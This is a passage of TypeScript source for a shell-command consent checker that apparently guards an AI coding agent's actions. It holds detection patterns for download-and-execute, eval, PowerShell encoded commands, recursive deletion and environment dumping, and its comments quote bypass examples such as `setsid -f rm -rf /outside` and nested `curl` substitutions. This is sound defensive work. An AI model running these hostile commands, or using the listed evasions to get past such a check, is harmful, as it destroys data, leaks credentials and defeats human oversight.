          if (/^(?:-c|--command)$/.test(t)) { commandString = toks[i + 1]; i += 2; continue; }
          if (/^(?:-T|--log-timing|-I|--log-in|-B|--log-io|-O|--log-out|-m|--logging-format|-F)$/.test(t)) {
            i += 2; continue;
          }
          i++;
          continue;
        }
        if (!fileConsumed) { fileConsumed = true; i++; continue; } // typescript 输出文件
        break; // BSD 形态的 command
      }
      if (commandString !== undefined) {
        if (!commandString) break; // -c 缺值 → 形态不可解析,留壳 fail-closed
        toks = tokenize(commandString);
      } else {
        if (i >= toks.length) break; // 没有内层命令(纯记录交互会话)→ 留壳
        toks = toks.slice(i);
      }
    } else if (head === 'sg') {
      // sg GROUP [-c] '<命令串>':以另一个组身份执行命令串(缺 -c 时最后一个操作数同样是命令串)。
      let i = 1;
      let groupConsumed = false;
      let shellForm = false;
      while (i < toks.length) {
        const t = toks[i];
        if (t === '--') { i++; break; }
        if (t === '-c' || t === '--command') { shellForm = true; i++; break; }
        if (t.startsWith('-')) { i++; continue; }
        if (!groupConsumed) { groupConsumed = true; i++; continue; }
        break;
      }
      toks = toks.slice(i);
      if (toks.length === 0) break; // 只切组、没有命令(交互 shell)→ 留壳
      if ((shellForm || toks.length === 1) && /\s/.test(toks[0])) toks = tokenize(toks[0]);
    } else if (head === 'arch' || head === 'caffeinate') {
      // macOS:`arch [-arch NAME] [-e VAR=VAL] … command args`、`caffeinate [-disu] [-t secs] [-w pid] command`。
      // 只消费确知带独立值的选项(少吃 → 值当命令名 → 未知 bin → 灰区 fail-closed)。
      const valued = head === 'arch'
        ? /^(?:-arch|-e|-d|-l)$/
        : /^(?:-t|-w)$/;
      let i = 1;
      while (i < toks.length) {
        const t = toks[i];
        if (t === '--') { i++; break; }
        if (!t.startsWith('-')) break;
        if (valued.test(t)) { i += 2; continue; }
        i++;
      }
      if (i >= toks.length) break; // 裸 `arch`/`caffeinate` 不跑命令 → 留壳
      toks = toks.slice(i);
    } else if (head === 'setsid' || head === 'unbuffer') {
      // setsid [-c] [-f] [-w] PROGRAM:选项在实际 program 之前,只删 setsid 会停在 `-f`/`--wait` 而看不到
      // 内层命令(codex 报 `setsid -f rm -rf /outside`)。这些选项都不带值 → 逐个跳过,`--` 终结选项。
      // unbuffer 同形(`unbuffer [-p] PROGRAM`,唯一选项 -p 不带值)。
      let i = 1;
      while (i < toks.length) {
        if (toks[i] === '--') { i++; break; }
        if (toks[i].startsWith('-')) { i++; continue; }
        break;
      }
      toks = toks.slice(i);
    } else {
      // nohup / builtin 等无自身参数的包裹器:直接跳过包裹器本身。
      toks = toks.slice(1);
    }
  }
  // 仅当**跑满剥壳上限**(depth 到 MAX,而非分支主动 break 的正常完成/fail-closed 留壳)且首 token 仍是
  // 包装器 → 超深链没剥完、真实命令没露出来,标记 fail-closed(消费方必问)。分支主动 bail(如 taskset -p、
  // env -S)在 depth<MAX 处 break,不算未解析,避免误升。
  const wrapperUnresolved = depth >= MAX_WRAPPER_UNWRAP_DEPTH
    && toks.length > 0 && COMMAND_WRAPPERS.has(executableName(toks[0]));
  return { tokens: toks, cwd, cwdUnknown, inspectionOnly, wrapperUnresolved };
}

/** 无需 cwd 语义的调用点只取剥壳后的真实 argv。 */
function unwrapWrappers(tokens: string[]): string[] {
  return unwrapCommand(tokens).tokens;
}

function baseName(p: string): string {
  // 同时按 `/` 与 `\` 取末段:Windows Codex 会话把命令以完整反斜杠路径传入
  // (`C:\Program Files\…\pwsh.exe`、`C:\…\rm.exe`),只认 `/` 会把整条路径当文件名,
  // 令 PowerShell / rm / git 等红线判定全部落空(codex 报,translator 已固定该形态)。
  const cleaned = p.replace(/[\\/]+$/, '');
  const idx = Math.max(cleaned.lastIndexOf('/'), cleaned.lastIndexOf('\\'));
  return idx >= 0 ? cleaned.slice(idx + 1) : cleaned;
}

/** Executable identity is case-insensitive on Windows; Git Bash commonly exposes `*.exe`. */
function executableName(token: string): string {
  return baseName(token).toLowerCase().replace(/\.exe$/, '');
}

type ShellSeparator = 'and' | 'or' | 'pipe' | 'sequence' | 'background' | 'end';
type ExecutableSegment = { text: string; fromPipe: boolean; separatorAfter: ShellSeparator };

/** 仅供高影响执行判定：识别引号外的 shell 分隔符，避免把 `echo 'x | sh'` 误当执行。 */
function splitExecutableSegments(command: string): ExecutableSegment[] {
  const out: ExecutableSegment[] = [];
  let start = 0;
  let fromPipe = false;
  let singleQuoted = false;
  let doubleQuoted = false;
  let escaped = false;
  let substitutionDepth = 0;
  for (let i = 0; i < command.length; i++) {
    const char = command[i];
    if (escaped) { escaped = false; continue; }
    if (char === '\\' && !singleQuoted) { escaped = true; continue; }
    if (char === "'" && !doubleQuoted) { singleQuoted = !singleQuoted; continue; }
    if (char === '"' && !singleQuoted) { doubleQuoted = !doubleQuoted; continue; }
    if (singleQuoted || doubleQuoted) continue;
    // `$(` 命令替换、`<(`/`>(` 进程替换都成组,组内的 `|`/`;` 不是顶层分隔符 → 一并按深度跳过
    // (自审补:此前漏了输出进程替换 `>(`,`>(cmd1; cmd2)` 里的 `;` 会被误当顶层分隔)。
    if ((char === '$' || char === '<' || char === '>') && command[i + 1] === '(') {
      substitutionDepth += 1;
      i++;
      continue;
    }
    if (substitutionDepth > 0) {
      if (char === '(') substitutionDepth += 1;
      else if (char === ')') substitutionDepth -= 1;
      continue;
    }
    let separatorLength = 0;
    let nextFromPipe = false;
    let separatorAfter: ShellSeparator = 'sequence';
    if (char === '|') {
      separatorLength = command[i + 1] === '|' || command[i + 1] === '&' ? 2 : 1;
      nextFromPipe = command[i + 1] !== '|';
      separatorAfter = nextFromPipe ? 'pipe' : 'or';
    } else if (char === '&' && command[i - 1] !== '>' && command[i + 1] !== '>') {
      separatorLength = command[i + 1] === '&' ? 2 : 1;
      separatorAfter = command[i + 1] === '&' ? 'and' : 'background';
    } else if (char === ';' || char === '\n') {
      separatorLength = 1;
      separatorAfter = 'sequence';
    }
    if (separatorLength === 0) continue;
    const text = command.slice(start, i).trim();
    if (text) out.push({ text, fromPipe, separatorAfter });
    fromPipe = nextFromPipe;
    i += separatorLength - 1;
    start = i + 1;
  }
  const text = command.slice(start).trim();
  if (text) out.push({ text, fromPipe, separatorAfter: 'end' });
  return out;
}

const SHELL_EXECUTORS: ReadonlySet<string> = new Set([
  'sh', 'bash', 'zsh', 'dash', 'ksh', 'fish', 'csh', 'tcsh',
]);

const PIPE_EXECUTORS: ReadonlySet<string> = new Set([
  ...SHELL_EXECUTORS,
  'node', 'nodejs', 'deno', 'bun',
  'ruby', 'perl', 'php', 'lua', 'luajit',
  'pwsh', 'pwsh.exe', 'powershell', 'powershell.exe',
  'r', 'rscript', 'tclsh', 'wish', 'julia', 'groovy', 'swift', 'osascript',
  'guile', 'racket', 'scheme', 'chezscheme', 'csi', 'gosh', 'mit-scheme',
  'clisp', 'sbcl', 'ecl', 'qjs', 'xargs', 'parallel',
]);

function isPipeExecutor(bin: string): boolean {
  const normalized = executableName(bin);
  return PIPE_EXECUTORS.has(normalized)
    || /^(?:python|pypy|ruby|perl|php|lua)\d*(?:\.\d+)*$/.test(normalized)
    || /^(?:(?:g|m|n|go)?awk)\d*(?:\.\d+)*$/.test(normalized)
    || /^(?:guile|racket)(?:-\d+(?:\.\d+)*)?$/.test(normalized);
}

/** shell 的 `-c` 可与其它短选项组合（如 `-lc` / `-xec`）；返回其命令字符串。 */
function shellCommandPayload(tokens: string[]): string | null {
  if (!SHELL_EXECUTORS.has(executableName(tokens[0] ?? ''))) return null;
  for (let i = 1; i < tokens.length; i++) {
    const token = tokens[i];
    if (token === '--') return null;
    if (token === '--command' || /^-[^-]*c[^-]*$/.test(token)) {
      return tokens[i + 1] ?? '';
    }
  }
  return null;
}

/** 常见解释器把下一参数当源码执行的 flag / 子命令。 */
function interpreterInlineCodePayload(tokens: string[]): string | null {
  const bin = executableName(tokens[0] ?? '');
  if (bin === 'deno' && tokens[1]?.toLowerCase() === 'eval') return tokens[2] ?? '';
  const flags = /^(?:python|pypy)\d*(?:\.\d+)*$/.test(bin) ? ['-c']
    : /^(?:node|nodejs|bun)$/.test(bin) ? ['-e', '--eval', '-p', '--print']
      : /^(?:ruby|lua|luajit)\d*(?:\.\d+)*$/.test(bin) ? ['-e']
        : bin === 'perl' ? ['-e', '-E']
          : bin === 'php' ? ['-r']
            : /^(?:pwsh|powershell)$/.test(bin) ? ['-c', '-command', '-e', '-encodedcommand']
              : /^(?:r|rscript|julia|groovy|swift|osascript)$/.test(bin) ? ['-e', '--eval']
                : [];
  for (let i = 1; i < tokens.length; i++) {
    const token = tokens[i];
    const lower = token.toLowerCase();
    for (const flag of flags) {
      const normalizedFlag = flag.toLowerCase();
      if (lower === normalizedFlag) return tokens[i + 1] ?? '';
      if (normalizedFlag.startsWith('--') && lower.startsWith(`${normalizedFlag}=`)) {
        return token.slice(flag.length + 1);
      }
      if (normalizedFlag.length === 2 && lower.startsWith(normalizedFlag) && token.length > 2) {
        return token.slice(flag.length);
      }
    }
  }
  return null;
}

// 静态审查的递归深度上限:命令替换/shell -c/xargs·parallel 包装每层递增一次,超过即认定结构已
// 不可静态求证,fail-closed(见各调用点)。取 6 兼顾现实嵌套(3-4 层已属极端)与 DoS 边界。
const MAX_EXEC_REVIEW_DEPTH = 6;

function commandRunsRemoteFetch(command: string, depth = 0): boolean {
  if (depth >= MAX_EXEC_REVIEW_DEPTH) return true; // 深到无法静态求证 → 保守当作远端下载
  for (const { text } of splitExecutableSegments(command)) {
    const tokens = unwrapWrappers(tokenize(text));
    const bin = executableName(tokens[0] ?? '');
    if (bin === 'curl' || bin === 'wget') return true;
    const shellPayload = shellCommandPayload(tokens);
    if (shellPayload && commandRunsRemoteFetch(shellPayload, depth + 1)) return true;
    // xargs 结构化取被包装 argv 再判(`xargs -n1 curl …`);未建模选项(如 `-x`)令 xargsCommandTokens
    // 返回 null,此时退回扫任意 token 是否 curl/wget,不放过下载传播(greptile 报 `xargs -x curl … | ./run`)。
    if (bin === 'xargs') {
      const nested = xargsCommandTokens(tokens);
      if (nested === null) {
        if (tokens.slice(1).some((t) => { const e = executableName(t); return e === 'curl' || e === 'wget'; })) return true;
      } else if (nested.length > 0
        && commandRunsRemoteFetch(serializeArgvForReview(nested), depth + 1)) return true;
    }
    // parallel 选项文法复杂(`-j1` / `-j 1` / `:::`),不做完整建模:直接下载看任意 token 是否 curl/wget
    // (跳过前导选项对首 token 的干扰,greptile 报 `parallel -j1 curl … ::: 1`);shell 载荷则从首个
    // shell 执行器处下探(`parallel [-j1] sh -c 'curl …'`)。
    if (bin === 'parallel') {
      const rest = tokens.slice(1);
      if (rest.some((t) => { const e = executableName(t); return e === 'curl' || e === 'wget'; })) return true;
      const shIdx = rest.findIndex((t) => SHELL_EXECUTORS.has(executableName(t)));
      if (shIdx >= 0
        && commandRunsRemoteFetch(serializeArgvForReview(rest.slice(shIdx)), depth + 1)) return true;
    }
  }
  return false;
}

/**
 * Return the COMMAND argv executed by common GNU/BSD xargs forms. `null` means
 * an option shape we cannot safely model; an empty array means xargs' benign
 * default `echo` command. Keeping argv structured preserves a shell `-c`
 * payload as one token for recursive review.
 */
function xargsCommandTokens(tokens: string[]): string[] | null {
  if (executableName(tokens[0] ?? '') !== 'xargs') return null;
  const longFlags = new Set([
    '--null', '--no-run-if-empty', '--verbose', '--interactive', '--exit',
    '--show-limits', '--open-tty', '--help', '--version',
  ]);
  const longWithValue = /^(?:--arg-file|--delimiter|--eof|--replace|--max-lines|--max-args|--max-procs|--max-chars|--process-slot-var)$/;
  const longAttachedValue = /^(?:--arg-file|--delimiter|--eof|--replace|--max-lines|--max-args|--max-procs|--max-chars|--process-slot-var)=/;
  let i = 1;
  while (i < tokens.length) {
    const token = tokens[i];
    if (token === '--') return tokens.slice(i + 1);
    if (longFlags.has(token)) { i++; continue; }
    if (longWithValue.test(token)) {
      if (i + 1 >= tokens.length) return [];
      i += 2;
      continue;
    }
    if (longAttachedValue.test(token)) { i++; continue; }
    // GNU no-argument switches may be clustered (for example `-0rt`).
    if (/^-[0rtpxo]+$/.test(token)) { i++; continue; }
    // These short options consume either the rest of the same token or the next token.
    if (/^-(?:a|d|E|I|L|n|P|s|J|R|S)$/.test(token)) {
      if (i + 1 >= tokens.length) return [];
      i += 2;
      continue;
    }
    if (/^-(?:a|d|E|I|L|n|P|s|J|R|S).+/.test(token)) { i++; continue; }
    // Deprecated GNU -e/-i/-l take only an optional attached value.
    if (/^-(?:e|i|l).*$/.test(token)) { i++; continue; }
    if (token.startsWith('-')) return null;
    return tokens.slice(i);
  }
  return [];
}

function serializeArgvForReview(tokens: string[]): string {
  return tokens.map((token) => JSON.stringify(token)).join(' ');
}

// kind 仅保留签名兼容:命令替换 `$()`/反引号 与进程替换 `<()` 里含 curl/wget 都是下载向量,一视同仁。
// 用平衡取体 + 递归覆盖任意深度与跨类嵌套 —— 单层正则只抓最内层,漏掉实际下载的外层 curl
// (greptile 报 `bash -c "$(curl $(echo url))"`、`source <(curl $(echo url))`)。
function substitutionRunsRemoteFetch(text: string, _kind: 'command' | 'process', depth = 0): boolean {
  if (depth >= MAX_EXEC_REVIEW_DEPTH) return true; // 深到不可静态求证 → 保守当作远端下载
  for (const body of substitutionBodies(text)) {
    if (commandRunsRemoteFetch(body)) return true;
    if (substitutionRunsRemoteFetch(body, _kind, depth + 1)) return true;
  }
  return false;
}

/**
 * 提取命令替换 `$(…)` / 进程替换 `<(…)` / 反引号 的**外层**内层文本,`$(`·`<(` 按括号深度取
 * 平衡子串。单层正则只抓到最内层,令外层 eval/下载执行逃过确定性红线
 * (greptile 报 `echo $(eval "$(echo payload)")`);返回外层体后,递归调用者会再拆其中的内层。
 */
function substitutionBodies(text: string): string[] {
  const out: string[] = [];
  for (let i = 0; i < text.length; i++) {
    // `$(` 命令替换、`<(`/`>(` 进程替换(输入与**输出**两向都会起子进程执行,greptile 报 `echo >(eval "$X")`)。
    const opensParen = (text[i] === '$' || text[i] === '<' || text[i] === '>') && text[i + 1] === '(';
    if (opensParen) {
      // 括号计数必须**跳过引号内的字面括号**:否则 `$(eval 'touch; #(')` 里引号内的 `(` 会抬高深度、
      // 让外层 `$(` 永远闭合不了,替换体取不出、内层 eval 逃过红线(greptile 报)。
      let depth = 1;
      let j = i + 2;
      let sq = false;
      let dq = false;
      let esc = false;
      for (; j < text.length && depth > 0; j++) {
        const c = text[j];
        if (esc) { esc = false; continue; }
        if (c === '\\' && !sq) { esc = true; continue; }
        if (c === "'" && !dq) { sq = !sq; continue; }
        if (c === '"' && !sq) { dq = !dq; continue; }
        if (sq || dq) continue;
        // shell 注释:`#` 在词首(行首/空白/**任一未引用 metacharacter** 之后:`( ) ; & | < >` 等)起注释到
        // 行尾,其中的 `)` 是字面不是替换体终点(greptile 报 `$(echo ok # )…` 与 `$( (echo ok)# )…`,后者 `#`
        // 前是 `)`)→ 跳到换行,避免注释里的 `)` 提前截断。
        if (c === '#' && (j === i + 2 || /[\s(){}<>;&|]/.test(text[j - 1]))) {
          while (j + 1 < text.length && text[j + 1] !== '\n') j++;
          continue;
        }
        if (c === '(') depth++;
        else if (c === ')') depth--;
      }
      if (depth === 0) {
        out.push(text.slice(i + 2, j - 1));
        i = j - 1; // 跳过整个外层替换,内层交给递归拆解
      }
      continue;
    }
    if (text[i] === '`') {
      // 找配对反引号时必须跳过**转义**反引号(`\``):嵌套反引号替换靠转义定界
      // (`` `echo \`eval "$X"\`` ``),把 `\`` 当外层终点会截断替换体、漏掉内层 eval(greptile 报)。
      let end = -1;
      for (let j = i + 1; j < text.length; j++) {
        if (text[j] === '\\') { j++; continue; }
        if (text[j] === '`') { end = j; break; }
      }
      if (end > i) {
        // 内层体里的 `\`` 还原成 `` ` ``,让递归能继续按普通反引号拆下一层。
        out.push(text.slice(i + 1, end).replace(/\\`/g, '`'));
        i = end;
      }
    }
  }
  return out;
}

/**
 * PowerShell 载荷的确定性红线(payload 语法与 POSIX 不同,scopedDestruction 的 rm/ 等规则识别不到):
 *   - `-EncodedCommand`(及唯一前缀缩写 -e/-enc/…)= base64,静态不可读 → 必问;
 *   - 明文 `-Command` 载荷含递归/强制删除、磁盘格式化、Invoke-Expression(eval)、下载 | iex → 必问。
 * codex 报:此前只查了 PowerShell 载荷里的命令替换下载,没过破坏/系统控制检查。
 */
const POWERSHELL_DANGER_PATTERNS: readonly RegExp[] = [
  /\b(?:remove-item|rm|ri|rd|rmdir|del|erase)\b[\s\S]*?-(?:recurse|r|force|f)\b/i, // 递归/强制删除(rm 是 Remove-Item 官方别名,codex 报)
  /\b(?:format-volume|clear-disk|format-disk)\b/i,                              // 磁盘格式化/清空
  /\b(?:invoke-expression|iex)\b/i,                                            // eval
  /\b(?:invoke-webrequest|iwr|invoke-restmethod|irm)\b[\s\S]*\|\s*(?:iex|invoke-expression)\b/i, // 下载 | iex
];

function powerShellNeedsConsent(tokens: string[]): boolean {
  if (!/^(?:pwsh|powershell)$/.test(executableName(tokens[0] ?? ''))) return false;
  let payload: string | null = null;
  for (let i = 1; i < tokens.length; i++) {
    const raw = tokens[i];
    const name = raw.split('=')[0].toLowerCase();
    // -EncodedCommand(-e/-ec/-enc/…):base64 静态不可读 → 必问(不可只当灰区)。
    if (name.length >= 2 && '-encodedcommand'.startsWith(name)) return true;
    // -Command(-c/-co/…)后的**全部**剩余 token 构成待执行命令(PowerShell 语义),不能只取紧邻一个:
    // 非引号形态 `-Command Remove-Item -Recurse -Force C:\Users` 的 `-Recurse/-Force` 在后续 token 里
    // (codex 报,现有回归都把载荷包成单引号 token 才命中)→ 拼接全部剩余 token 再交危险模式扫描。
    if (name.length >= 2 && '-command'.startsWith(name)) {
      payload = raw.includes('=')
        ? [raw.slice(raw.indexOf('=') + 1), ...tokens.slice(i + 1)].join(' ')
        : tokens.slice(i + 1).join(' ');
      break;
    }
  }
  return payload !== null && POWERSHELL_DANGER_PATTERNS.some((re) => re.test(payload as string));
}

/** 管道/下载内容被直接解释执行或 eval 时，模型不得单独静默放行。 */
function highImpactExecutionNeedsConsent(command: string, depth = 0): boolean {
  let pipeCarriesRemoteContent = false;
  for (const { text, fromPipe, separatorAfter } of splitExecutableSegments(command)) {
    const normalized = text.replace(/['"\\]/g, '');
    const unwrapped = unwrapCommand(tokenize(normalized));
    const tokens = unwrapped.tokens;
    // 超深包装器链剥不完 → 看不到真实命令,fail-closed 必问(codex 报)。
    if (unwrapped.wrapperUnresolved) return true;
    const bin = executableName(tokens[0] ?? '');
    const rawTokens = unwrapCommand(tokenize(text)).tokens;
    // 去引号+去反斜杠的 normalized 会抹掉 Windows 盘符路径的 `\` 分隔符,令 `"C:\…\pwsh.exe"` 这类
    // 完整路径解释器识别不出(copilot 报)→ 额外用保留反斜杠的 rawTokens 求一次 bin,任一命中即算执行器。
    const rawBin = executableName(rawTokens[0] ?? '');
    if (fromPipe && !unwrapped.inspectionOnly) {
      if (isPipeExecutor(bin) || isPipeExecutor(rawBin)) return true;
      // An incomplete interpreter enum must never turn remote "download and
      // execute" into a model-allowable gray action. Only consumers proven
      // passive by the existing read-only classifier may keep the pipeline in Auto.
      if (pipeCarriesRemoteContent && !isSafeReadonlyBin(bin, normalized, tokens)) return true;
    }
    if (bin === 'eval' || rawBin === 'eval') return true;
    // 全环境导出(裸 set / export -p / declare -x 等,含凭证)= exfil 红线;cmd 载荷递归下探使
    // `cmd /c set` 也命中(codex 报)。
    if (dumpsFullEnvironmentCommand(rawTokens)) return true;
    // 命令/进程替换体会作为副作用执行:其中的 eval / 下载即执行 / 破坏性载荷不能因外层是 echo 等普通
    // 命令而降入灰区(greptile 报 `echo $(eval "$X")` / `bash <<< "$(eval "$X")"`)→ 递归审查每个替换体。
    // 超出递归上限仍存在替换体 = 深层嵌套(`echo $(a $(b $(c $(eval …))))`)静态不可证清白 → fail-closed
    // 必问,不得因到达深度上限而静默降灰(greptile 报)。
    if (substitutionBodies(text).some(
      (body) => depth + 1 >= MAX_EXEC_REVIEW_DEPTH
        || highImpactExecutionNeedsConsent(body, depth + 1))) return true;
    // PowerShell 载荷(-Command 明文的破坏/eval、-EncodedCommand 的 base64)过确定性红线(codex 报)。
    if (powerShellNeedsConsent(rawTokens)) return true;
    const payload = shellCommandPayload(rawTokens);
    if (payload && (substitutionRunsRemoteFetch(payload, 'command')
      || depth >= MAX_EXEC_REVIEW_DEPTH
      || highImpactExecutionNeedsConsent(payload, depth + 1))) return true;
    // cmd.exe /c "…" 载荷同样可包 powershell -enc / 下载即执行 → 递归下探(codex 报的 cmd 包装面)。
    const cmdInner = cmdCommandPayload(rawTokens);
    if (cmdInner && (depth >= MAX_EXEC_REVIEW_DEPTH
      || highImpactExecutionNeedsConsent(cmdInner, depth + 1))) return true;
    const inlineCode = interpreterInlineCodePayload(rawTokens);
    if (inlineCode !== null && substitutionRunsRemoteFetch(inlineCode, 'command')) return true;
    if (executableName(rawTokens[0] ?? '') === 'xargs') {
      const nested = xargsCommandTokens(rawTokens);
      if (nested === null) {
        // Unknown xargs options only cross the deterministic boundary when a
        // visible shell executor is present; otherwise the gray reviewer remains usable.
        if (rawTokens.slice(1).some((token) => SHELL_EXECUTORS.has(executableName(token)))) return true;
      } else if (nested.length > 0 && (depth >= MAX_EXEC_REVIEW_DEPTH || highImpactExecutionNeedsConsent(
        serializeArgvForReview(nested), depth + 1))) {
        return true;
      }
    }
    // 进程替换 `<(curl…)` 与命令替换 `$(curl…)`/反引号 都能把下载内容喂给 shell/解释器执行:
    // `source <(curl…)`、`bash <<< "$(curl…)"`、`python <<< "$(curl…)"` 等 here-string/直参形态同属
    // 远程代码执行红线(codex 报:此前只查了进程替换,漏了命令替换)。仅当 $() 内含 curl/wget 才命中,
    // 本地 `$(cat f)` 不误伤。
    if ((bin === 'source' || bin === '.' || isPipeExecutor(bin))
      && (substitutionRunsRemoteFetch(text, 'process')
        || substitutionRunsRemoteFetch(text, 'command'))) return true;
    const segmentFetchesRemoteContent = commandRunsRemoteFetch(text);
    pipeCarriesRemoteContent = separatorAfter === 'pipe'
      && (pipeCarriesRemoteContent || segmentFetchesRemoteContent);
  }
  return false;
}

type ShellReviewOptions = {
  cwd?: string;
  cwdUnknown?: boolean;
  platform?: NodeJS.Platform;
};

/** 提取普通位置参数；`--` 后即使以 `-` 开头也按目标处理。 */
function positionalOperands(tokens: string[]): string[] {
  const out: string[] = [];
  let optionsEnded = false;
  for (const token of tokens) {
    if (!optionsEnded && token === '--') {
      optionsEnded = true;
      continue;
    }
    if (!optionsEnded && token.startsWith('-')) continue;
    out.push(token);
  }
  return out;
}

/** 破坏性目标是否无法证明被限制在首个可写根的子目录内。 */
/**
 * 破坏目标里的字符类 `[…]` 能否展开出路径穿越字符 `.`(0x2E)或 `/`(0x2F)——能则运行期可拼出 `..`/额外
 * 分隔符逃出静态前缀(greptile 报 `rm -rf sub/[.-x][.-x]/etc/passwd`,`[.-x]` 范围含 `.`/`/`)。
 * 含字面 `.`/`/`、跨越它们的范围(如 `[.-x]`)、或取反类(`[!…]`/`[^…]` 几乎匹配任意字符)都算。
 */
function charClassCanTraverse(target: string): boolean {
  for (const m of target.matchAll(/\[([^\]]*)\]/g)) {
    const body = m[1];
    if (/^[!^]/.test(body)) return true;               // 取反类可匹配 . / 等
    if (body.includes('.') || body.includes('/')) return true;
    for (const rm of body.matchAll(/(.)-(.)/g)) {
      if (rm[1].charCodeAt(0) <= 0x2f && rm[2].charCodeAt(0) >= 0x2e) return true; // 范围覆盖 . 或 /
    }
  }
  return false;
}

function destructiveTargetNeedsConsent(
  target: string,
  workspaceRoots: string[],
  opts: ShellReviewOptions,
): boolean {
  const writableRoot = workspaceRoots[0];
  if (!writableRoot) return true;
  // 变量、命令/花括号展开的运行期目标不可静态求值；`~` 也不能按 cwd 解析。
  if (/[$`{}]/.test(target) || target.startsWith('~')) return true;
  // 字符类能展开出 `.`/`/` → 运行期路径可穿越出静态前缀,不可静态证明在区内 → 必问(greptile 报)。
  if (charClassCanTraverse(target)) return true;
  if (opts.cwdUnknown && !isAbsolutePath(toForwardSlashes(target))) return true;
  // glob 可保留，只用首个 glob 前的静态前缀证明作用域。前缀落在可写根本身仍是“清空整个
  // workspace”级别；只有明确进入子目录（如 build/*）才交 reviewer 静默裁决。
  const globIndex = target.search(/[*?[\]]/);
  const staticTarget = globIndex >= 0 ? (target.slice(0, globIndex) || '.') : target;
  const cwd = opts.cwd ?? writableRoot;
  const aliasFirmlinks = (opts.platform ?? process.platform) === 'darwin';
  const normalizedRoot = canonicalPath(writableRoot, aliasFirmlinks);
  if (normalizedRoot === '/' || /^[A-Za-z]:\/$/.test(normalizedRoot)) return true;
  const candidates = [staticTarget];
  if (globIndex >= 0) {
    // A bracket expression may itself spell `..` (`[.].`). Check the same
    // conservative de-glob form used by the credential classifier so a glob
    // cannot make the runtime path escape farther than its literal prefix.
    candidates.push(target.replace(/[[\]{}*?]/g, '') || '.');
  }
  return candidates.some((candidate) => {
    const normalizedTarget = normalizeTarget(candidate, [cwd]);
    if (!isInsideWorkspace(normalizedTarget, [writableRoot], aliasFirmlinks)) return true;
    return canonicalPath(normalizedTarget, aliasFirmlinks) === normalizedRoot;
  });
}

function findDeleteRoots(tokens: string[]): string[] {
  let i = 1;
  // find 的遍历选项先于路径；-D 额外消费一个 debug 参数。
  while (i < tokens.length) {
    const token = tokens[i];
    if (token === '-D') { i += 2; continue; }
    if (/^-(?:[HLP]|O\d*)$/.test(token)) { i++; continue; }
    if (token === '--') { i++; break; }
    break;
  }
  const roots: string[] = [];
  for (; i < tokens.length; i++) {
    const token = tokens[i];
    if (token.startsWith('-') || token === '!' || token === '(') break;
    roots.push(token);
  }
  return roots.length > 0 ? roots : ['.'];
}

function forcePushNeedsConsent(tokens: string[]): boolean {
  // executableName 归一 `.exe`/大小写:`git.exe push --force`、`GIT.EXE …` 不得绕过受保护分支红线(codex 报)。
  if (executableName(tokens[0] ?? '') !== 'git') return false;
  const pushIndex = tokens.indexOf('push');
  if (pushIndex < 0) return false;
  const args = tokens.slice(pushIndex + 1);
  const forced = args.some((token) =>
    /^(?:--force(?:-with-lease|-if-includes)?)(?:=|$)/.test(token)
    || /^-[^-]*f/.test(token)
    || token.startsWith('+'));
  if (!forced) return false;
  if (args.some((token) => /^(?:--all|--mirror|--tags)$/.test(token))) return true;
  const operands = positionalOperands(args);
  const refspecs = operands.length >= 2 ? operands.slice(1) : [];
  if (refspecs.length === 0) return true; // 隐含当前分支，无法证明不是受保护分支。
  return refspecs.some((refspec) => {
    const withoutForce = refspec.replace(/^\+/, '');
    const destination = (withoutForce.includes(':')
      ? withoutForce.slice(withoutForce.lastIndexOf(':') + 1)
      : withoutForce).replace(/^refs\/heads\//, '');
    if (!destination || /[$`*?[\]{}]/.test(destination)) return true;
    if (/^(?:HEAD|@|refs\/tags\/)/i.test(destination)) return true;
    return /^(?:main|master|trunk|develop(?:ment)?|prod(?:uction)?|staging|release(?:[/_-].*)?|hotfix(?:[/_-].*)?)$/i.test(destination);
  });
}

/** destructive rm 的显式目标；不是递归/强制 rm 时返回 null。 */
function destructiveRmTargets(tokens: string[]): string[] | null {
  // executableName 归一 `.exe`/大小写:`rm.exe -rf …`、`RM.EXE …` 不得绕过区外破坏红线(codex 报)。
  if (executableName(tokens[0] ?? '') !== 'rm') return null;
  const args = tokens.slice(1);
  const destructive = args.some((token) =>
    /^-[^-]*[rRfF]/.test(token) || /^--(?:recursive|force|dir)(?:=|$)/.test(token));
  return destructive ? positionalOperands(args) : null;
}

/**
 * 无具名变量的全环境导出(含注入子进程的 provider API key/token)→ exfil 红线。覆盖:
 *   - Windows cmd 裸 `set`(无参数);`set -e`/`set FOO=1`/`set /A x=1` 带参形态不算(codex 报)。
 *   - Bash `export -p` / 裸 `export`(列出全部导出变量);`export FOO`/`export FOO=1` 具名不算(codex 报)。
 *   - Bash `declare -x` / `declare -p` / `typeset -x`(带值列出全部);带 NAME 操作数具名不算。
 * (POSIX 裸 `env`/`printenv` 的等价形态由 classifyShellSegment 另行处理。)
 */
function dumpsFullEnvironmentCommand(tokens: string[]): boolean {
  const bin = executableName(tokens[0] ?? '');
  const args = tokens.slice(1);
  const operands = args.filter((a) => !a.startsWith('-'));
  if (bin === 'set') return args.length === 0;
  if (bin === 'export') return operands.length === 0;          // 裸 export / export -p
  if (bin === 'declare' || bin === 'typeset') {
    // 无具名操作数即列出全部变量+值:裸 `declare`/`typeset`(help declare:无 NAME 显示所有变量属性与值),
    // 或带 -x/-p/-f 等列举选项(codex 报:此前漏了裸调用形态)。有 NAME 具名不算。
    return operands.length === 0;
  }
  return false;
}

/** cmd.exe `/c`/`/k`/`/r` 后的载荷命令(其余全部构成待执行命令);非 cmd 启动器返回 null。 */
function cmdCommandPayload(tokens: string[]): string | null {
  if (executableName(tokens[0] ?? '') !== 'cmd') return null;
  for (let i = 1; i < tokens.length; i++) {
    const flag = tokens[i].toLowerCase();
    if (flag === '/c' || flag === '/k' || flag === '/r') {
      return tokens.slice(i + 1).join(' ');
    }
  }
  return null;
}

/**
 * Windows cmd.exe 广泛递归删除(`rd`/`rmdir`/`del`/`erase` 带 `/s`)的显式目标;非此形态返回 null。
 * `/s` = 递归删整棵树(rmdir 文档),等价 POSIX `rm -rf` 的破坏面 → 交目标级作用域判定(codex 报)。
 */
function windowsDestructiveRmTargets(tokens: string[]): string[] | null {
  const bin = executableName(tokens[0] ?? '');
  if (bin !== 'rd' && bin !== 'rmdir' && bin !== 'del' && bin !== 'erase') return null;
  const args = tokens.slice(1);
  if (!args.some((token) => /^\/s$/i.test(token))) return null; // 无 /s 非广泛递归
  const targets = args.filter((token) => !token.startsWith('/'));
  return targets.length > 0 ? targets : null;
}

function directoryChangeTarget(tokens: string[]): { changesDirectory: boolean; target?: string } {
